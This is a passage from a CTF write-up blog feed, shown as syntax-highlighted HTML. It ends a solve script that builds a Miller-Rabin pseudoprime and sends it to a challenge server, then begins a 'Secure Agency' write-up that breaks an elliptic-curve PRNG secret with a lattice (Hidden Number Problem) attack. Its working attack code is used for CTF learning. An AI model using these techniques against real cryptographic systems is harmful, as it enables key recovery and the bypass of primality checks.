    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">X</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">X</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">X_</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">M_</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">X</span><span class="p">),</span> <span class="n">segment_size</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">X</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
                <span class="n">X_</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
                <span class="n">M_</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">M</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">X_</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">crt</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="n">segment_size</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="n">segment_size</span><span class="p">]))</span>
                <span class="n">M_</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">lcm</span><span class="p">(</span><span class="o">*</span><span class="n">M</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="n">segment_size</span><span class="p">]))</span>
        <span class="n">X</span> <span class="o">=</span> <span class="n">X_</span>
        <span class="n">M</span> <span class="o">=</span> <span class="n">M_</span>

    <span class="k">return</span> <span class="n">X</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

<span class="c1"># https://github.com/jvdsn/crypto-attacks/blob/master/attacks/pseudoprimes/miller_rabin.py
# =========================================================================================
</span><span class="k">def</span> <span class="nf">_generate_s</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">k</span><span class="p">):</span>
    <span class="n">S</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">A</span><span class="p">:</span>
        <span class="c1"># Possible non-residues mod 4a of potential primes p
</span>        <span class="n">Sa</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">a</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">kronecker</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                <span class="n">Sa</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>

        <span class="c1"># Subsets of Sa that meet the intersection requirement
</span>        <span class="n">Sk</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">ki</span> <span class="ow">in</span> <span class="n">k</span><span class="p">:</span>
            <span class="k">assert</span> <span class="n">gcd</span><span class="p">(</span><span class="n">ki</span><span class="p">,</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">a</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span>
            <span class="n">Sk</span><span class="p">.</span><span class="n">append</span><span class="p">({</span><span class="nb">pow</span><span class="p">(</span><span class="n">ki</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="n">ki</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="n">a</span><span class="p">)</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">Sa</span><span class="p">})</span>

        <span class="n">S</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">Sa</span><span class="p">.</span><span class="n">intersection</span><span class="p">(</span><span class="o">*</span><span class="n">Sk</span><span class="p">))</span>

    <span class="k">return</span> <span class="n">S</span>

<span class="k">def</span> <span class="nf">_backtrack</span><span class="p">(</span><span class="n">S</span><span class="p">,</span> <span class="n">A</span><span class="p">,</span> <span class="n">X</span><span class="p">,</span> <span class="n">M</span><span class="p">,</span> <span class="n">i</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">S</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">fast_crt</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>

    <span class="n">M</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="k">for</span> <span class="n">za</span> <span class="ow">in</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
        <span class="n">X</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">za</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">fast_crt</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
            <span class="n">z</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="n">_backtrack</span><span class="p">(</span><span class="n">S</span><span class="p">,</span> <span class="n">A</span><span class="p">,</span> <span class="n">X</span><span class="p">,</span> <span class="n">M</span><span class="p">,</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">z</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">m</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">z</span><span class="p">,</span> <span class="n">m</span>
        <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
            <span class="k">pass</span>
        <span class="n">X</span><span class="p">.</span><span class="n">pop</span><span class="p">()</span>

    <span class="n">M</span><span class="p">.</span><span class="n">pop</span><span class="p">()</span>
    <span class="k">return</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">generate_pseudoprime</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">k2</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">k3</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">min_bit_length</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
    <span class="s">"""
    Generates a pseudoprime of the form p1 * p2 * p3 which passes the Miller-Rabin primality test for the provided bases.
    More information: R. Albrecht M. et al., "Prime and Prejudice: Primality Testing Under Adversarial Conditions"
    :param A: the bases
    :param k2: the k2 value (default: next_prime(A[-1]))
    :param k3: the k3 value (default: next_prime(k2))
    :param min_bit_length: the minimum bit length of the generated pseudoprime (default: 0)
    :return: a tuple containing the pseudoprime n, as well as its 3 prime factors
    """</span>
    <span class="n">A</span><span class="p">.</span><span class="n">sort</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">k2</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">k2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">next_prime</span><span class="p">(</span><span class="n">A</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
    <span class="k">if</span> <span class="n">k3</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">k3</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">next_prime</span><span class="p">(</span><span class="n">k2</span><span class="p">))</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Trying </span><span class="si">{</span><span class="n">k2</span> <span class="o">=</span> <span class="si">}</span><span class="s"> and </span><span class="si">{</span><span class="n">k3</span> <span class="o">=</span> <span class="si">}</span><span class="s">..."</span><span class="p">)</span>
        <span class="n">X</span> <span class="o">=</span> <span class="p">[</span><span class="nb">pow</span><span class="p">(</span><span class="o">-</span><span class="n">k3</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">k2</span><span class="p">),</span> <span class="nb">pow</span><span class="p">(</span><span class="o">-</span><span class="n">k2</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">k3</span><span class="p">)]</span>
        <span class="n">M</span> <span class="o">=</span> <span class="p">[</span><span class="n">k2</span><span class="p">,</span> <span class="n">k3</span><span class="p">]</span>
        <span class="n">S</span> <span class="o">=</span> <span class="n">_generate_s</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">S</span> <span class="o">=</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="n">z</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="n">_backtrack</span><span class="p">(</span><span class="n">S</span><span class="p">,</span> <span class="n">A</span><span class="p">,</span> <span class="n">X</span><span class="p">,</span> <span class="n">M</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">z</span> <span class="ow">and</span> <span class="n">m</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Found residue </span><span class="si">{</span><span class="n">z</span><span class="si">}</span><span class="s"> and modulus </span><span class="si">{</span><span class="n">m</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2</span> <span class="o">**</span> <span class="p">(</span><span class="n">min_bit_length</span> <span class="o">//</span> <span class="mi">3</span><span class="p">))</span> <span class="o">//</span> <span class="n">m</span>
            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
                <span class="n">p1</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">z</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="n">m</span><span class="p">)</span>
                <span class="n">p2</span> <span class="o">=</span> <span class="n">k2</span> <span class="o">*</span> <span class="p">(</span><span class="n">p1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
                <span class="n">p3</span> <span class="o">=</span> <span class="n">k3</span> <span class="o">*</span> <span class="p">(</span><span class="n">p1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
                <span class="k">if</span> <span class="n">is_prime</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">is_prime</span><span class="p">(</span><span class="n">p2</span><span class="p">)</span> <span class="ow">and</span> <span class="n">is_prime</span><span class="p">(</span><span class="n">p3</span><span class="p">):</span>
                    <span class="k">return</span> <span class="n">p1</span> <span class="o">*</span> <span class="n">p2</span> <span class="o">*</span> <span class="n">p3</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span> <span class="n">p3</span>

                <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">k3</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">next_prime</span><span class="p">(</span><span class="n">k3</span><span class="p">))</span>
<span class="c1"># =========================================================================================
</span>
<span class="n">bases</span> <span class="o">=</span> <span class="n">predict_bases</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">X</span><span class="p">,</span> <span class="n">rounds</span><span class="o">=</span><span class="mi">6</span><span class="p">)</span>
<span class="n">N</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span> <span class="n">p3</span> <span class="o">=</span> <span class="n">generate_pseudoprime</span><span class="p">(</span><span class="n">bases</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Found pseudoprime N = </span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Factor 1 (p1) = </span><span class="si">{</span><span class="n">p1</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Factor 2 (p2*p3) = </span><span class="si">{</span><span class="n">p2</span> <span class="o">*</span> <span class="n">p3</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"0"</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your prime: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">N</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Description: "</span><span class="p">,</span><span class="sa">b</span><span class="s">":iku:"</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"4"</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Factor 1: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">p1</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Factor 2: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">p2</span><span class="o">*</span><span class="n">p3</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="c1"># wack{7Hi5_7im3_wi7h_4_5i6n3d_c0mP3ri50N}
</span></code></pre></div></div>]]></content><author><name>Zukane</name></author><category term="writeups" /><category term="Miller-Rabin" /><category term="PRNG" /><category term="Pwn" /><summary type="html"><![CDATA[Challenge overview]]></summary></entry><entry><title type="html">Secure Agency (WackAttack CTF 2025)</title><link href="https://zukane.github.io/secure-agency/" rel="alternate" type="text/html" title="Secure Agency (WackAttack CTF 2025)" /><published>2025-10-05T12:00:00+02:00</published><updated>2025-10-05T12:00:00+02:00</updated><id>https://zukane.github.io/secure-agency</id><content type="html" xml:base="https://zukane.github.io/secure-agency/"><![CDATA[<h5 id="challenge-overview">Challenge overview</h5>

<p>In this CTF challenge we are given the following server source code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">fastecdsa.curve</span> <span class="kn">import</span> <span class="n">P256</span>
<span class="kn">from</span> <span class="nn">secrets</span> <span class="kn">import</span> <span class="n">randbelow</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">bytes_to_long</span><span class="p">,</span> <span class="n">long_to_bytes</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="k">def</span> <span class="nf">segment</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="n">l</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">//</span> <span class="n">n</span>
    <span class="k">return</span> <span class="p">[</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">l</span><span class="p">])</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">),</span> <span class="n">l</span><span class="p">)]</span>

<span class="n">secret</span> <span class="o">=</span> <span class="n">randbelow</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">256</span><span class="p">)</span>
<span class="n">hidden</span> <span class="o">=</span> <span class="n">randbelow</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">128</span><span class="p">)</span>
<span class="n">FLAG</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"FLAG"</span><span class="p">,</span> <span class="s">"wack{demo_flag}"</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">Randomizer</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">seed</span><span class="p">):</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">randbelow</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">256</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">Q</span> <span class="o">=</span> <span class="n">P256</span><span class="p">.</span><span class="n">G</span> <span class="o">*</span> <span class="n">r</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">P</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">Q</span> <span class="o">*</span> <span class="n">secret</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">P</span> <span class="o">*</span> <span class="n">seed</span><span class="p">).</span><span class="n">x</span>

    <span class="k">def</span> <span class="nf">_updatestate</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">P</span> <span class="o">*</span> <span class="bp">self</span><span class="p">.</span><span class="n">state</span><span class="p">).</span><span class="n">x</span>

    <span class="k">def</span> <span class="nf">random</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">out</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">Q</span> <span class="o">*</span> <span class="bp">self</span><span class="p">.</span><span class="n">state</span><span class="p">).</span><span class="n">x</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">_updatestate</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">out</span>

    <span class="k">def</span> <span class="nf">get_public_parameters</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">P</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">Q</span>

    <span class="k">def</span> <span class="nf">randombytes</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">n</span><span class="p">):</span>
        <span class="n">k</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="mi">32</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">n</span> <span class="o">%</span> <span class="mi">32</span>
        <span class="n">out</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">random</span><span class="p">()).</span><span class="n">rjust</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">r</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">out</span> <span class="o">+=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">2</span><span class="o">**</span><span class="p">(</span><span class="n">r</span><span class="o">*</span><span class="mi">8</span><span class="p">)).</span><span class="n">rjust</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">out</span>

<span class="n">R</span> <span class="o">=</span> <span class="n">Randomizer</span><span class="p">(</span><span class="n">randbelow</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">256</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="n">randombytes</span><span class="p">(</span><span class="mi">16</span><span class="p">),</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
    <span class="n">f</span> <span class="o">=</span> <span class="n">c</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">FLAG</span><span class="p">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">f</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Welcome the agency secure flag server"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"What do you want to do. (1) Get info, (2) Get random, (3) get flag or (4) get public parameters"</span><span class="p">)</span>
    <span class="n">i</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">match</span> <span class="n">i</span><span class="p">:</span>
        <span class="n">case</span> <span class="s">"1"</span><span class="p">:</span>
            <span class="n">a</span> <span class="o">=</span> <span class="n">randbelow</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">256</span><span class="p">)</span>
            <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">hidden</span> <span class="o">&lt;&lt;</span> <span class="mi">128</span><span class="p">)</span> <span class="o">|</span> <span class="n">randbelow</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">128</span><span class="p">)</span>
            <span class="n">c</span> <span class="o">=</span> <span class="n">randbelow</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">256</span><span class="p">)</span>
            <span class="n">d</span> <span class="o">=</span> <span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">P256</span><span class="p">.</span><span class="n">q</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">c</span><span class="o">*</span><span class="n">secret</span><span class="p">)</span> <span class="o">%</span> <span class="n">P256</span><span class="p">.</span><span class="n">q</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Here are some hints</span><span class="se">\n</span><span class="si">{</span><span class="n">a</span><span class="o">=</span><span class="si">}</span><span class="se">\n</span><span class="s">b=?</span><span class="se">\n</span><span class="si">{</span><span class="n">c</span><span class="o">=</span><span class="si">}</span><span class="se">\n</span><span class="si">{</span><span class="n">d</span><span class="o">=</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="n">case</span> <span class="s">"2"</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Random value = </span><span class="si">{</span><span class="n">R</span><span class="p">.</span><span class="n">random</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="n">case</span> <span class="s">"3"</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Flag = </span><span class="si">{</span><span class="n">get_flag</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="n">case</span> <span class="s">"4"</span><span class="p">:</span>
            <span class="n">P</span><span class="p">,</span> <span class="n">Q</span> <span class="o">=</span> <span class="n">R</span><span class="p">.</span><span class="n">get_public_parameters</span><span class="p">()</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"P = </span><span class="si">{</span><span class="n">P</span><span class="si">}</span><span class="se">\n</span><span class="s">Q = </span><span class="si">{</span><span class="n">Q</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="n">case</span> <span class="n">_</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"Not a valid option"</span><span class="p">)</span>
</code></pre></div></div>

<h5 id="source-code-analysis">Source code analysis</h5>

<p>The script defines a custom PRNG <code class="language-plaintext highlighter-rouge">Randomizer</code> which evolves the state through scalar-multiplication on the P256 elliptic curve. The service presents a menu with different choices, allowing us to get hints about the secret values, call <code class="language-plaintext highlighter-rouge">R.random</code>, encrypt the flag, and get the public parameters $P$ and $Q$ where $Q$ is a random point on the curve and $P = secret \cdot Q$.</p>

<p>The flag is encrypted with AES ECB with a 16-byte key generated from <code class="language-plaintext highlighter-rouge">Randomizer.randombytes()</code>. To decrypt the flag, we must learn the state of the PRNG.</p>

<h5 id="recovering-the-secret">Recovering the secret</h5>

<p>Menu option 1 <code class="language-plaintext highlighter-rouge">Get info</code> returns a set of integers $a,c,d$ where $a$ and $c$ are random 256-bit integers, and:</p>

\[\large \begin{align}
\nonumber b &amp;= (h \ll 128) + r \\
\nonumber d &amp;\equiv b^{-1}(a+c\cdot s) \mod N
\end{align}\]

<p>Here, $s$ is the 256-bit fixed secret, $h$ is the fixed 128-bit hidden integer and $r$ is a random 128-bit value for each query. We can rearrange:</p>

\[\large \begin{align}
\nonumber a+c\cdot s &amp;\equiv d\cdot b \mod N\\
\nonumber (a+c \cdot s)d^{-1} &amp;\equiv b \mod N
\end{align}\]

<p>By subtracting two instances from one-another, we eliminate the fixed unknown $h$ and are left with the small unknown $r_{i} - r_{1}$:</p>

\[\large (a_{i}+c_{i} \cdot s)d_{i}^{-1} - (a_{0}+c_{0} \cdot s)d_{0}^{-1} \equiv r_{i} -r_{0} \mod N\]

<p>We can expand the parenthesis $(a+c \cdot s)d^{-1}$ and define two variables, $t$ and $u$:</p>

\[\large \begin{align}
\nonumber t_{i} = c_{i}d_{i}^{-1} - c_{0}d_{0}^{-1}  \\
\nonumber u_{i} = a_{i}d_{i}^{-1} - a_{0}d_{0}^{-1}
\end{align}\]

<p>We denote the small random unknown $r_{i}-r_{0}$ as $\beta_{i}$:</p>

\[\large \begin{align}
\nonumber t_{i} \cdot s-u_{i} \equiv r_{i}-r_{0} \mod N \\
\nonumber \beta_{i} - t_{i} \cdot s + u_{i} \equiv 0 \mod N
\end{align}\]

<p>Which is a standard Hidden Number Problem instance with know $t,u$, unknown $s$ and unknown small $\beta$. This instance can be solved using LLL on the standard HNP lattice:</p>

\[\large M = \begin{pmatrix}
NI_{n} &amp; 0 &amp; 0 \\
t &amp; B/N &amp; 0 \\
u &amp; 0 &amp; B
\end{pmatrix}\]

<p>Which has a target vector $v = (\beta_{1},\dots,\beta_{m},s B/N,-B)$, thus recovering the secret $s$.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">HNP</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">t</span><span class="p">,</span><span class="n">p</span><span class="p">,</span><span class="n">B</span><span class="p">):</span>
    <span class="n">n</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">M</span> <span class="o">=</span> <span class="n">block_matrix</span><span class="p">([</span>
